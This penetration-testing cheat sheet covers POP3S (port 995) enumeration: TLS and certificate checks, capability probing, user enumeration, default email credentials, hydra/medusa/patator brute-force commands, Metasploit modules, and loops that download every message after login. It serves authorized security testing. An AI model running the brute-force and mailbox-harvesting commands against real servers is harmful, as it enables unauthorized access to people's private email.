# POP3S ENUMERATION (Port 995)

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p995 <IP>                              # Service/Version detection
openssl s_client -connect <IP>:995 -crlf         # Connect with SSL/TLS
openssl s_client -connect <IP>:995 -crlf -quiet  # Quiet mode
nc -nv <IP> 995                                  # Won't work without TLS

# Get banner
openssl s_client -connect <IP>:995 -crlf -quiet 2>/dev/null
# Server responds with banner like: +OK POP3 server ready
```

## SSL/TLS CERTIFICATE ENUMERATION
```bash
# Get certificate details
openssl s_client -connect <IP>:995 2>/dev/null | openssl x509 -noout -text
openssl s_client -connect <IP>:995 -showcerts 2>/dev/null

# Certificate subject/issuer
openssl s_client -connect <IP>:995 2>/dev/null | openssl x509 -noout -subject
openssl s_client -connect <IP>:995 2>/dev/null | openssl x509 -noout -issuer

# Check certificate SANs (may reveal email domains)
openssl s_client -connect <IP>:995 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
nmap -p995 --script ssl-cert <IP>
```

## SSL/TLS SECURITY TESTING
```bash
# Cipher suite enumeration
nmap --script ssl-enum-ciphers -p995 <IP>
sslscan <IP>:995
sslyze --regular <IP>:995

# SSL/TLS version testing
openssl s_client -ssl3 -connect <IP>:995         # SSLv3 (should fail)
openssl s_client -tls1 -connect <IP>:995         # TLS 1.0
openssl s_client -tls1_1 -connect <IP>:995       # TLS 1.1
openssl s_client -tls1_2 -connect <IP>:995       # TLS 1.2
openssl s_client -tls1_3 -connect <IP>:995       # TLS 1.3

# Comprehensive SSL/TLS testing
testssl.sh <IP>:995
testssl.sh --vulnerable <IP>:995
```

## POP3 CAPABILITY ENUMERATION
```bash
# Get server capabilities
echo "CAPA" | openssl s_client -connect <IP>:995 -crlf -quiet 2>/dev/null

# Nmap POP3 capabilities
nmap -p995 --script pop3-capabilities <IP>

# Check for NTLM authentication (may leak version info)
nmap -p995 --script pop3-ntlm-info <IP>
```

## MANUAL POP3 ENUMERATION
```bash
# Connect and enumerate
openssl s_client -connect <IP>:995 -crlf -quiet
# Then type:
CAPA                                             # List capabilities
USER username                                    # Username
PASS password                                    # Password
LIST                                             # List messages
RETR 1                                           # Retrieve message 1
DELE 1                                           # Delete message 1
STAT                                             # Get mailbox statistics
QUIT                                             # Disconnect

# One-liner POP3 commands
echo "CAPA" | openssl s_client -connect <IP>:995 -crlf -quiet 2>/dev/null
echo -e "USER admin\nPASS password\nLIST" | openssl s_client -connect <IP>:995 -crlf -quiet 2>/dev/null
```

## USER ENUMERATION
```bash
# POP3 user enumeration (response-based)
nmap -p995 --script pop3-ntlm-info <IP>          # May leak domain/hostname

# Manual user enum
for user in $(cat users.txt); do
    echo -e "USER $user" | openssl s_client -connect <IP>:995 -crlf -quiet 2>&1 | grep -i "ok\|err"
done

# Different responses for valid vs invalid users
# Valid: +OK User accepted
# Invalid: -ERR User not found
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l user@<domain> -P passwords.txt -s 995 <IP> pop3
hydra -L users.txt -P passwords.txt -s 995 <IP> pop3
hydra -l admin -P rockyou.txt -s 995 -t 4 <IP> pop3  # Limit threads

# Medusa
medusa -h <IP> -n 995 -u user@domain.com -P passwords.txt -M pop3
medusa -h <IP> -n 995 -U users.txt -P passwords.txt -M pop3

# Nmap
nmap -p995 --script pop3-brute --script-args userdb=users.txt,passdb=passwords.txt <IP>

# Patator
patator pop3_login host=<IP> port=995 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt ssl=1 -x ignore:fgrep='Authentication failed'
```

## DEFAULT CREDENTIALS
```bash
# Common email credentials
admin@<domain>:admin
administrator@<domain>:password
support@<domain>:support
test@<domain>:test
info@<domain>:info
postmaster@<domain>:postmaster

# Test default credentials
echo -e "USER admin\nPASS admin" | openssl s_client -connect <IP>:995 -crlf -quiet 2>/dev/null
```

## NTLM INFORMATION DISCLOSURE
```bash
# Extract NTLM info (Windows domain, version, hostname)
nmap -p995 --script pop3-ntlm-info <IP>

# Manual NTLM authentication request
echo -ne "AUTH NTLM\r\n" | openssl s_client -connect <IP>:995 -crlf -quiet
# Server may respond with NTLM challenge containing system info
```

## VULNERABILITY SCANNING
```bash
# SSL/TLS vulnerabilities
nmap -p995 --script ssl-heartbleed <IP>          # Heartbleed
nmap -p995 --script ssl-poodle <IP>              # POODLE
nmap -p995 --script ssl-drown <IP>               # DROWN
testssl.sh --vulnerable <IP>:995                 # All SSL vulnerabilities

# POP3-specific vulnerabilities
searchsploit pop3
nmap -p995 --script vuln <IP>
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/pop3/pop3_version          # Version detection
use auxiliary/scanner/pop3/pop3_login            # Login brute force
use auxiliary/scanner/ssl/openssl_heartbleed     # Heartbleed
set RPORT 995
```

## POST-EXPLOITATION (After successful login)
```bash
# Connect with credentials
openssl s_client -connect <IP>:995 -crlf -quiet
USER user@domain.com
PASS password
STAT                                             # Get mailbox stats
LIST                                             # List all messages
RETR 1                                           # Retrieve message 1
RETR 2                                           # Retrieve message 2
DELE 1                                           # Delete message 1 (careful!)
QUIT

# Automated email download with cURL
curl -k "pop3s://<IP>:995" -u user@domain.com:password
curl -k "pop3s://<IP>:995/1" -u user:password    # Retrieve specific email
```

## EMAIL HARVESTING
```bash
# Download all emails
openssl s_client -connect <IP>:995 -crlf -quiet
USER user
PASS password
LIST                                             # See how many emails
RETR 1                                           # Download each one
RETR 2
# ... continue for all emails

# Using cURL to download emails
for i in {1..10}; do
    curl -k "pop3s://<IP>:995/$i" -u user:password > email_$i.txt
done
```

## INTERESTING FILES & DATA
```bash
# Look for sensitive information in emails:
# - Passwords in plain text
# - Private keys/certificates
# - Configuration files
# - VPN credentials
# - Password reset links
# - Internal system information
# - Attachment references
# - Contact information
```

## COMMON MISCONFIGURATIONS
```
☐ Self-signed certificate                       # Dev/test environment
☐ Weak SSL/TLS configuration                     # SSLv3, TLS 1.0, weak ciphers
☐ Default credentials                            # Easy access
☐ Clear text authentication allowed              # USER/PASS in plain text
☐ Verbose error messages                         # Information disclosure
☐ NTLM authentication enabled                    # Info leakage
☐ No rate limiting                               # Brute force attacks
☐ Outdated POP3 server                           # Known vulnerabilities
☐ Certificate name mismatch                      # Configuration error
☐ No account lockout policy                     # Unlimited login attempts
```

## QUICK WIN CHECKLIST
```
☐ Test default credentials
☐ Check SSL/TLS configuration (weak ciphers, old protocols)
☐ Test for Heartbleed (OpenSSL < 1.0.1g)
☐ Extract NTLM information (domain, hostname, version)
☐ Check certificate for SANs (email domains)
☐ Brute force with common passwords
☐ Search for known POP3 vulnerabilities
☐ Test for user enumeration
☐ Check certificate validity and chain
☐ Test for anonymous access
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive POP3S scan
nmap -sV -p995 --script "pop3-* and ssl-*" -oA pop3s_enum <IP>

# Quick SSL/TLS vulnerability check
testssl.sh --vulnerable <IP>:995

# Quick capability check
echo "CAPA" | openssl s_client -connect <IP>:995 -crlf -quiet 2>/dev/null
```

## ADVANCED TECHNIQUES
```bash
# Check for multiple SSL certificates (SNI)
openssl s_client -connect <IP>:995 -servername mail.<domain>

# Test compression (CRIME vulnerability)
openssl s_client -connect <IP>:995 2>/dev/null | grep Compression

# Session resumption test
openssl s_client -connect <IP>:995 -reconnect 2>/dev/null | grep "Session-ID"

# OCSP stapling
openssl s_client -connect <IP>:995 -status 2>/dev/null | grep -A17 "OCSP"

# Timing-based user enumeration
for user in admin test root; do
    time echo "USER $user" | openssl s_client -connect <IP>:995 -crlf -quiet 2>&1
done
```

## POP3 VS IMAP COMPARISON
```
POP3:
- Downloads emails to local client
- Typically deletes from server after download
- Simpler protocol
- Less features than IMAP
- Port 110 (plain), 995 (SSL/TLS)

IMAP:
- Keeps emails on server
- Synchronizes across multiple devices
- More complex protocol
- Folder management, flags, searching
- Port 143 (plain), 993 (SSL/TLS)
```
